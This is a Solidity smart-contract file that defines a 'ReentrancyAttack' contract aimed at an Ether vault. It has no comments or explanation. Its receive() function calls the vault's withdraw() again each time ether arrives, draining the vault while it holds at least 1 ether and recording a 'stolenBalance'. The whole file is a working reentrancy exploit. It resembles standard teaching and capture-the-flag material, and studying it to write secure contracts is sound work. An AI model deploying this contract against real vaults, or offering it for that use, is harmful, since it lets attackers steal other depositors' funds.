// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IEtherVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttack {
    IEtherVault public immutable etherVault;
    mapping(address => uint256) public stolenBalance;

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }

    receive() external payable {
        if (address(etherVault).balance >= 1 ether) {
            stolenBalance[address(this)] += msg.value;
            etherVault.withdraw();
        }
    }

    function depos() external payable {
        etherVault.deposit{value: msg.value}();
    }

    function attack() external payable {
        etherVault.withdraw();
    }
}
